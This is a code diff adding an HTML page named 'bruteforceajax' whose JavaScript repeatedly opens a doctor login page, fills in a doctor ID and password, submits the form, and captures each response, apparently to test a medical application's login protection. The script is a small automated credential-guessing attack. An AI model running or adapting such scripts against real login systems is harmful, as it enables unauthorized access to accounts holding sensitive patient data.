@@ -1,0 +1,40 @@
+<html>
+<head>
+<title>bruteforceajax</title>
+<script type = "text/javascript">
+
+var bfwindow;
+var i = 0;
+start();
+function start(){
+	bfwindow = window.open("login/doc_login.php"); 
+	bfwindow.onload = function () {
+		bfwindow.document.getElementById("doctor_id").value = "D001";
+		bfwindow.document.getElementById("password").value = "11111111"; 
+		bfwindow.document.getElementById("submit").click();
+		triggertimer(bfwindow);
+		if(i<6){
+			i++;
+			setTimeout(start(),5000);
+		}
+	}
+
+}
+function triggertimer(win){
+	setTimeout(function(){bfwindow = win;	donext();},500);
+}
+function donext(){
+	document.getElementById("content").innerHTML += bfwindow.document.documentElement.innerHTML+"<br>";
+	bfwindow.close();
+}
+
+</script>
+</head>
+<body>
+brute force ajax
+<br>
+content:<br>
+<div id = "content">
+</div>
+</body>
+</html>
